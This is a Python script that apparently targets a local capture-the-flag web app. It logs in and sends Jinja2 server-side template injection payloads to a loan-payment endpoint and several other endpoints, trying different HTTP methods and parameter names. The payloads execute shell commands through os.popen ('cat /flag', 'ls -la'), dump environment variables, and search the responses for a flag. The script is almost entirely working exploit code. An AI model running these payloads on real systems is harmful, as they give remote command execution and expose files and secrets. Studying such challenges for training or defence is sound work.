import requests
import re
import sys

# Configuration
base_url = "http://127.0.0.1:32841"
login_url = f"{base_url}/login"
loan_url = f"{base_url}/total_loan_payments"

# Credentials
credentials = {"username": "test", "password": "test"}

print("="*60)
print("SSTI EXPLOIT - Testing Different HTTP Methods")
print("="*60)

# Step 1: Login to get session
try:
    session = requests.Session()
    login_response = session.post(login_url, data=credentials)
    print(f"[1] Login status: {login_response.status_code}")
    print(f"[1] Session cookies: {dict(session.cookies)}")
    
    if login_response.status_code != 200:
        print("[!] Login failed, aborting")
        sys.exit(1)
        
except Exception as e:
    print(f"[!] Login error: {e}")
    sys.exit(1)

# Step 2: Test simple GET to /total_loan_payments first
print(f"\n[2] Testing GET request to {loan_url}")
try:
    response = session.get(loan_url)
    print(f"[2] GET status: {response.status_code}")
    print(f"[2] Response length: {len(response.text)} chars")
    
    if response.status_code == 200:
        print(f"[2] GET response (first 300 chars):\n{response.text[:300]}")
    
except Exception as e:
    print(f"[!] GET error: {e}")

# Step 3: Test GET with SSTI payload in query parameter
print(f"\n[3] Testing GET with SSTI payload in query parameter")
ssti_payloads_get = [
    ("Simple evaluation", "{{ 7*7 }}"),
    ("Config class", "{{ config.__class__ }}"),
    ("List subclasses", "{{ ''.__class__.__mro__[2].__subclasses__()[:10] }}"),
    ("Env vars", "{{ config.__class__.__init__.__globals__['os'].environ }}")
]

for name, payload in ssti_payloads_get:
    try:
        params = {"loan_amount": payload}
        response = session.get(loan_url, params=params)
        
        print(f"\n[*] Payload: {name}")
        print(f"[*] Status: {response.status_code}")
        print(f"[*] Response: {response.text[:300]}")
        
        # Check for flag
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"[!] FLAG FOUND: {flag_match.group(0)}")
            print(f"[!] Full response: {response.text}")
            
    except Exception as e:
        print(f"[!] Error with {name}: {e}")

# Step 4: Try other HTTP methods
print(f"\n[4] Testing other HTTP methods")

methods = ["POST", "PUT", "PATCH"]
params_to_test = [
    "{{ config.__class__.__init__.__globals__['os'].popen('cat /flag*').read() }}",
    "{{ config.__class__.__init__.__globals__['os'].environ.get('FLAG', 'Not found') }}",
    "{{ lipsum.__globals__['os'].popen('ls -la').read() }}"
]

for method in methods:
    print(f"\n[*] Testing {method}")
    try:
        if method == "POST":
            response = session.post(loan_url, data={"loan_amount": params_to_test[0]})
        elif method == "PUT":
            response = session.put(loan_url, data={"loan_amount": params_to_test[0]})
        elif method == "PATCH":
            response = session.patch(loan_url, data={"loan_amount": params_to_test[0]})
        
        print(f"[*] {method} status: {response.status_code}")
        print(f"[*] Response: {response.text[:200]}")
        
    except Exception as e:
        print(f"[!] {method} error: {e}")

# Step 5: Test different parameter names
print(f"\n[5] Testing different parameter names")
param_names = ["loan_amount", "amount", "loan", "value", "data"]
test_payload = "{{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}"

for param_name in param_names:
    print(f"\n[*] Testing param: {param_name}")
    
    try:
        # Try GET with different parameter
        response = session.get(loan_url, params={param_name: test_payload})
        print(f"[GET] Status: {response.status_code}")
        
        if "FLAG{" in response.text or response.status_code != 405:
            print(f"[+] Response: {response.text[:300]}")
        
        # Try POST with different parameter
        response = session.post(loan_url, data={param_name: test_payload})
        print(f"[POST] Status: {response.status_code}")
        
        if "FLAG{" in response.text or response.status_code != 405:
            print(f"[+] Response: {response.text[:300]}")
            
    except Exception as e:
        print(f"[!] Error: {e}")

# Step 6: Check for other endpoints that might accept POST
print(f"\n[6] Testing related endpoints")

other_endpoints = [
    f"{base_url}/login",
    f"{base_url}/profile", 
    f"{base_url}/dashboard",
    f"{base_url}/api"
]

for endpoint in other_endpoints:
    print(f"\n[*] Testing endpoint: {endpoint}")
    try:
        response = session.post(endpoint, data={"test": "{{ 7*7 }}"})
        print(f"[+] Status: {response.status_code}")
        if "49" in response.text and response.status_code == 200:
            print(f"[!] SSTI RESPONSE DETECTED! 7*7 evaluated to 49")
            print(f"[!] Response: {response.text}")
    except Exception as e:
        print(f"[!] Error: {e}")

print(f"\n{'='*60}")
print("METHOD TESTING COMPLETED")
print("="*60)
